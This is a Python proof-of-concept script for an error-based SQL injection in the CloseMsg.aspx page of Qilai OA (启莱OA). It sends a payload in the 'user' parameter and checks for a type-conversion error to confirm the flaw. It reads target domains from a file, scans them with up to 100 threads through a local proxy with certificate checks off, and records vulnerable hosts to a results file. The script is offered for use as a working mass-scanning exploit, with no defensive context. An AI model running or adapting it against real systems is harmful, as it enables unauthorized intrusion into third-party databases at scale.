# 启莱OA CloseMsg.aspx SQL注入漏洞
# 作者 charis

import requests
from requests.packages import urllib3
urllib3.disable_warnings()
from threading import Thread, enumerate
from time import sleep

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0"
}

proxies = {
    "http": "http://127.0.0.1:10811",
    "https": "https://127.0.0.1:10811",
}

def postData(url, headers, proxies):
    try:
        s = ""
        poc = f"/client/CloseMsg.aspx?user=' and (select db_name())>0--&pwd=1"
        urldata = url.strip("\n") + poc
        requests.packages.urllib3.disable_warnings()
        re = requests.post(urldata, headers=headers, proxies=proxies, verify=False)
        if re.status_code == 500:
            if re.text.find("转换成数据类型 int 时失败") >= 0:
                print("[+]存在漏洞", urldata)
                s += urldata + "\n"
                with open("D:\\code\\python\\exp\\启莱OA\\result.txt", "a", encoding="utf-8") as f:
                    f.write(s)
    except requests.exceptions.ConnectionError:
        pass

with open("D:\\code\\python\\exp\\启莱OA\\domain.txt", encoding="utf-8") as f:
    for i in f.readlines():
        if len(enumerate()) < 100:
            Thread(target=postData, args=(i, headers, proxies)).start()
        else:
            sleep(1)